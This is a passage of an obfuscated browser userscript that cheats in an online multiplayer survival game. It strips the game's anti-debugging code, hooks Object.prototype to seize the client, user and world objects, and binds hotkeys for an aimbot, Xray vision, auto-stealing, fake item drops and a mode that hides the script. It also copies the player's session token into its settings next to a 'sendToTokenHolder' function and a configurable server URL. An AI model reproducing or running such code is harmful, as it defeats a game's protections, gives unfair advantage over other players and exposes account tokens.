          a0DEFErport(a0OVERrideclick.CAMPFIRE);
        }
      }
      if (a0JUMPfile.AutoTotem.e && !USERTOFIX.totem.wait && USERTOFIX.team.length === 0) {
        let aU = a0CLONelog.units[a0HOOKjob.TOTEM];
        for (let a3 = 0, aB = aU.length; a3 < aB; a3++) {
          let aj = aU[a3];
          if (a0CLONescript.dist(e, aj) < 300 && !((aU.info & 16) >> 4) && aj.info < 8) {
            a0BLOCklist(aj.pid, aj.id);
          }
        }
      }
      if (a0JUMPfile.AutoKsDeadBox.e) {
        let ax = a0CLONelog.units[a0HOOKjob.DEAD_BOX].filter(e => !e.isAnimalBox);
        let a1 = null;
        if (ax.length > 0) {
          a1 = ax.reduce((t, i) => a0CLONescript.dist(e, t) < a0CLONescript.dist(e, i) ? t : i);
        }
        if (a1) {
          let aK = a0INSTalllevel(e, true);
          let aw = performance.now() + a0BUILdresult / 2 + 62.5;
          if (a0CACHelogs(a1, aw) <= aK) {
            let aJ = a0CREAtesum(e);
            if (a0CLONescript.dist(e, a1) <= aJ) {
              workerTimers.setTimeout(() => {
                let t = a0KICKport(e, a1, true);
                a0JUMPfile.AutoKsDeadBox.angle = t;
                a0REMOveevent(t);
                a0CLONejson();
              }, 100);
            } else {
              a0JUMPfile.AutoKsDeadBox.angle = null;
            }
          } else {
            a0JUMPfile.AutoKsDeadBox.angle = null;
          }
        } else {
          a0JUMPfile.AutoKsDeadBox.angle = null;
        }
      }
      if (a0JUMPfile.AntiHood.e && USERTOFIX.inv.n[a0CONNectloop.PITCHFORK] && !a0INSErtform[e.right] && performance.now() - a0KICKsocket > 500 + a0BUILdresult) {
        let az = e.fly === 1 ? 269.8 : 205.6;
        let aF = a0CLONelog.units[a0HOOKjob.PLAYERS].find(t => t.hoodTimerV >= 0.8 && !t.ally && e.fly === t.fly && (a0CLONescript.dist(e, a0CLONequeue(t)) < az || a0CLONescript.dist(e, t) < az));
        if (aF) {
          let aW;
          if (e.right !== a0CONNectloop.PITCHFORK && USERTOFIX.inv.n[a0CONNectloop.PITCHFORK]) {
            aW = e.right;
            a0HYDRatequeue(a0CONNectloop.PITCHFORK);
          }
          a0KICKsocket = performance.now();
          a0JUMPfile.AntiHood.angle = a0EMITevent(e, aF);
          workerTimers.setTimeout(() => {
            a0HYDRatequeue(aW === -1 ? a0CONNectloop.HAND : aW);
          }, 100);
        } else {
          a0JUMPfile.AntiHood.angle = null;
        }
      } else {
        a0JUMPfile.AntiHood.angle = null;
      }
      if (a0CLONelog.mode === 6) {
        if (a0JUMPfile.AutoHamCmty.e) {
          if (e.right === a0CONNectloop.SUPER_HAMMER) {
            let a4 = [...a0CLONelog.units[a0HOOKjob.SPIKE], ...a0CLONelog.units[a0HOOKjob.STONE_SPIKE], ...a0CLONelog.units[a0HOOKjob.GOLD_SPIKE], ...a0CLONelog.units[a0HOOKjob.DIAMOND_SPIKE], ...a0CLONelog.units[a0HOOKjob.AMETHYST_SPIKE], ...a0CLONelog.units[a0HOOKjob.REIDITE_SPIKE]].filter(t => a0CLONescript.dist(e, t) < 125 && !t.ally);
            if (a4.length > 0) {
              let a2 = a4.reduce((t, i) => a0CLONescript.dist(e, t) < a0CLONescript.dist(e, i) ? t : i);
              let a6 = a0KICKport(e, a2, false);
              a0JUMPfile.AutoHamCmty.angle = a6;
              a0REMOveevent(a6);
              a0CLONejson();
            } else {
              a0JUMPfile.AutoHamCmty.angle = null;
            }
          } else {
            a0JUMPfile.AutoHamCmty.angle = null;
          }
        }
        if (a0JUMPfile.AutoGreenCrownCmty.e && USERTOFIX.gauges.l * 200 < 170 && USERTOFIX.inv.n[a0CONNectloop.CROWN_OF_LIFE] && e.clothe !== a0CONNectloop.CROWN_OF_LIFE && performance.now() - a0DISPatchdata > a0BUILdresult + 200 && 10000 - (Date.now() - a0LISTenjob.HPTimer) <= 500 + a0BUILdresult) {
          let aG = e.clothe;
          a0GETList.select_inv(a0CONNectloop.CROWN_OF_LIFE);
          a0DISPatchdata = performance.now();
          workerTimers.setTimeout(() => {
            a0GETList.select_inv(aG);
          }, 500);
        }
      }
    }
  }
}
function a0EXITnode() {
  unsafeWindow.Function = new Proxy(unsafeWindow.Function, {
    construct: (...e) => (e.length = 2, e[1][0].includes("debugger")) ? new e[0]("") : new e[0](...e[1])
  });
  Reflect.defineProperty(Object.prototype, "ping", {
    get() {
      return this[a0EXITinput];
    },
    set(e) {
      if (!a0GETList) {
        a0GETList = this;
        console.log("client:", a0GETList);
      }
      this[a0EXITinput] = e;
    }
  });
  Reflect.defineProperty(Object.prototype, "reconnect", {
    get() {
      return this[a0EXITinput];
    },
    set(e) {
      if (!USERTOFIX) {
        USERTOFIX = this;
        console.log("user:", USERTOFIX);
      }
      this[a0EXITinput] = e;
    }
  });
  Reflect.defineProperty(Object.prototype, "transition", {
    get() {
      return this[a0EXITinput];
    },
    set(e) {
      if (!a0CLONelog && !("cache" in this) && !!("mode" in this)) {
        a0CLONelog = this;
        console.log("world:", a0CLONelog);
      }
      this[a0EXITinput] = e;
    }
  });
  Reflect.defineProperty(Object.prototype, "sign", {
    get() {
      return this[a0EXITinput];
    },
    set(e) {
      if (!a0MINIfyresult) {
        a0MINIfyresult = this;
        console.log("game:", a0MINIfyresult);
      }
      this[a0EXITinput] = e;
    }
  });
  Reflect.defineProperty(Object.prototype, "angle", {
    get() {
      return this[a0EXITinput];
    },
    set(e) {
      if (!a0DECOdestatus && "IDLE" in this) {
        a0DECOdestatus = this;
        console.log("mouse:", a0DECOdestatus);
      }
      this[a0EXITinput] = e;
    }
  });
  Reflect.defineProperty(Object.prototype, "waiting", {
    get() {
      return this[a0EXITinput];
    },
    set(e) {
      if (!a0ACKNowledgevalue && "unlock" in this) {
        a0ACKNowledgevalue = this;
        console.log("ui", a0ACKNowledgevalue);
      }
      this[a0EXITinput] = e;
    }
  });
  // Reflect.defineProperty(Object.prototype, "down", {
  //   get() {
  //     return this[a0EXITinput];
  //   },
  //   set(e) {
  //     if (!a0QUEUeschema && "up" in this ) {
  //       a0QUEUeschema = this;
  //       console.log("keyboard", a0QUEUeschema);
  //     }
  //     this[a0EXITinput] = e;
  //   }
  // });
  Object.defineProperties(unsafeWindow, {
    world: {
      get: () => a0CLONelog
    },
    client: {
      get: () => a0GETList
    },
    user: {
      get: () => USERTOFIX
    },
    game: {
      get: () => a0MINIfyresult
    },
    mouse: {
      get: () => a0DECOdestatus
    },
    ui: {
      get: () => a0ACKNowledgevalue
    },
    // keyboard: {
    //   get: () => a0QUEUeschema
    // },
    Settings: {
      get: () => a0JUMPfile
    },
    myPlayer: {
      get: () => a0CLONelog.fast_units[USERTOFIX.uid]
    },
    lmbClient: {
      get: () => a0QUEUearray
    },
    INV: {
      get: () => a0CONNectloop
    },
    ITEMS: {
      get: () => a0HOOKjob
    },
    sprite: {
      get: () => a0MINIfydata
    },
    temp: {
      get: () => a0DRAWbuffer
    },
    getMissingIngredients: {
      get: () => a0DECOdenode
    },
    handleCraftBotCommand: {
      get: () => handleCraftBotCommand
    },
    getCraftableItem: {
      get: () => a0DEFIneloop
    },
    canCraftWithOneTime: {
      get: () => a0NOOPsession
    },
    craftInv: {
      get: () => a0CLOSeinput
    },
    sendToTokenHolder: {
      get: () => a0GRABrepo
    },
    LMB_SERVER_URL: {
      get: () => a0LOCKdata,
      set(e) {
        a0LOCKdata = e;
      }
    },
    MY_SPRITE: {
      get: () => a0EXPAndgroup
    },
    mySprite: {
      get: () => a0ACKNowledgekey
    },
    build_bridge: {
      get: () => a0NAVIgatequeue
    }
  });
}
unsafeWindow.LoadAfterGameLoad = () => {
  a0ENCRyptkey = (a0LOADstring = (a0BLOCkparser = document.getElementById("game_canvas")).getContext("2d")).drawImage;
  a0JUMPcontrol = a0BLOCkparser.width;
  a0INSErtstatus = a0BLOCkparser.height;
  a0LOADsocket = {
    x: a0BUILdload = a0BLOCkparser.width / 2,
    y: a0NORMalizequeue = a0BLOCkparser.height / 2
  };
  try {
    document.getElementById("option_in_game").style.opacity = 0.75;
    document.getElementById("shop_market").style.opacity = 0.75;
    document.getElementById("sure_delete").style.pointerEvents = 0.75;
    document.getElementById("cancel_sure_delete").style.pointerEvents = 0.75;
    document.getElementById("sure_delete").style.opacity = 0.75;
  } catch (e) {
    console.log("Error: ", e);
  }
  a0CLOSetask().then(() => {
    a0ENCRyptlog();
    a0GUARddisk();
    a0FORMatrole(0);
    workerTimers.setInterval(a0JOINzip, 1000 / 12);
    workerTimers.setInterval(a0CHECkpolicy, 2000);
    a0JUMPfile.Token.token = USERTOFIX.token;
    a0JUMPfile.Token.token_id = USERTOFIX.token_id;
    a0INSErtpolicy.refresh();
  });
  (async () => {
    try {
      let e = await import("https://cdn.jsdelivr.net/npm/tweakpane@4.0.5/dist/tweakpane.min.js");
      window.Tweakpane = e;
      a0DEFErloop.LoadHack?.();
    } catch (t) {
      console.error("[Tweakpane Load Error]", t);
    }
  })();
};
document.addEventListener("keydown", e => {
  if (!a0INVErtattempt()) {
    if (e.code === a0JUMPfile.Aimbot.k) {
      a0JUMPfile.Aimbot.e = !a0JUMPfile.Aimbot.e;
    }
    if (e.code === a0JUMPfile.AutoSpike.k) {
      a0JUMPfile.AutoSpike.e = true;
    }
    if (e.code === a0JUMPfile.AutoPvP.k) {
      a0JUMPfile.AutoPvP.e = true;
    }
    if (e.code === a0JUMPfile.AutoCraft.k) {
      a0JUMPfile.AutoCraft.e = !a0JUMPfile.AutoCraft.e;
    }
    if (e.code === a0JUMPfile.AutoRecycle.k) {
      a0JUMPfile.AutoRecycle.e = !a0JUMPfile.AutoRecycle.e;
    }
    if (e.code === a0JUMPfile.Xray.k) {
      a0JUMPfile.Xray.e = !a0JUMPfile.Xray.e;
      if (a0JUMPfile.Xray.e) {
        a0NOTIfystream();
      } else {
        a0PINGvalues();
      }
    }
    if (e.code === a0JUMPfile.AutoFarm.k) {
      a0JUMPfile.AutoFarm.e = !a0JUMPfile.AutoFarm.e;
    }
    if (e.code === a0JUMPfile.ExitVehicle.k) {
      a0JUMPfile.ExitVehicle.e = !a0JUMPfile.ExitVehicle.e;
    }
    if (e.code === a0JUMPfile.Spectator.k) {
      if (a0JUMPfile.Spectator.e) {
        a0GETList.get_focus();
      }
      a0JUMPfile.Spectator.e = !a0JUMPfile.Spectator.e;
    }
    if (e.code === a0JUMPfile.AutoSteal.k) {
      a0JUMPfile.AutoSteal.e = true;
    }
    if (e.code === a0JUMPfile.DropWeapon.k) {
      a0ENCRyptthread();
    }
    if (e.code === a0JUMPfile.AutoWall.k) {
      a0JUMPfile.AutoWall.e = true;
    }
    if (e.code === a0JUMPfile.FakeDrop.k) {
      a0JUMPfile.FakeDrop.e = !a0JUMPfile.FakeDrop.e;
      if (a0JUMPfile.FakeDrop.e) {
        a0INSErtschema();
      }
    }
    if (e.code === a0JUMPfile.AutoCraftSpikes.k) {
      a0JUMPfile.AutoCraftSpikes.e = !a0JUMPfile.AutoCraftSpikes.e;
    }
    if (e.code === a0JUMPfile.AutoFire.k) {
      a0JUMPfile.AutoFire.e = true;
    }
    if (e.code === a0JUMPfile.AutoTotem.k) {
      a0JUMPfile.AutoTotem.e = !a0JUMPfile.AutoTotem.e;
    }
    if (e.code === a0JUMPfile.BulkItems.k) {
      a0JUMPfile.BulkItems.e = true;
    }
    if (e.code === a0JUMPfile.AimbotSpike.k) {
      a0JUMPfile.AimbotSpike.e = !a0JUMPfile.AimbotSpike.e;
    }
    if (e.code === a0JUMPfile.AutoBuild.k) {
      a0JUMPfile.AutoBuild.e = !a0JUMPfile.AutoBuild.e;
    }
    if (e.code === a0JUMPfile.AutoSeed.k) {
      a0JUMPfile.AutoSeed.e = !a0JUMPfile.AutoSeed.e;
    }
    if (e.code === a0JUMPfile.AutoKsDeadBox.k) {
      a0JUMPfile.AutoKsDeadBox.e = !a0JUMPfile.AutoKsDeadBox.e;
    }
    if (e.code === a0JUMPfile.HideScript.k) {
      a0JUMPfile.HideScript.e = !a0JUMPfile.HideScript.e;
      a0DRAWkey();
    }
    if (e.code === a0JUMPfile.ExtractorTake.k) {
      a0JUMPfile.ExtractorTake.e = !a0JUMPfile.ExtractorTake.e;
    }
    if (e.code === a0JUMPfile.ExtractorPut.k) {
      a0JUMPfile.ExtractorPut.e = !a0JUMPfile.ExtractorPut.e;
    }
    if (e.code === a0JUMPfile.AutoBreadTake.k) {
      a0JUMPfile.AutoBreadTake.e = !a0JUMPfile.AutoBreadTake.e;
    }
    if (e.code === a0JUMPfile.AutoBreadPut.k) {
      a0JUMPfile.AutoBreadPut.e = !a0JUMPfile.AutoBreadPut.e;
    }
    a0INSErtpolicy?.refresh();
  }
});
document.addEventListener("keyup", e => {
  if (!a0INVErtattempt()) {
    if (e.code === a0JUMPfile.AutoSpike.k) {
      a0JUMPfile.AutoSpike.e = false;
    }
    if (e.code === a0JUMPfile.AutoPvP.k) {
      a0JUMPfile.AutoPvP.e = false;
    }
    if (e.code === a0JUMPfile.AutoSteal.k) {
      a0JUMPfile.AutoSteal.e = false;
    }
    if (e.code === a0JUMPfile.AutoWall.k) {
      a0JUMPfile.AutoWall.e = false;
    }
    if (e.code === a0JUMPfile.AutoFire.k) {
      a0JUMPfile.AutoFire.e = false;
    }
    if (e.code === a0JUMPfile.BulkItems.k) {
      a0JUMPfile.BulkItems.e = false;
    }
    if (e.code === a0JUMPfile.AimbotSpike.k && a0JUMPfile.AimbotSpike.mode === "HOLD") {
      a0JUMPfile.AimbotSpike.e = false;
    }
    a0INSErtpolicy?.refresh();
  }
});
document.addEventListener("visibilitychange", () => {
  a0DRAWparser = document.visibilityState !== "visible";
});
a0EXITnode();
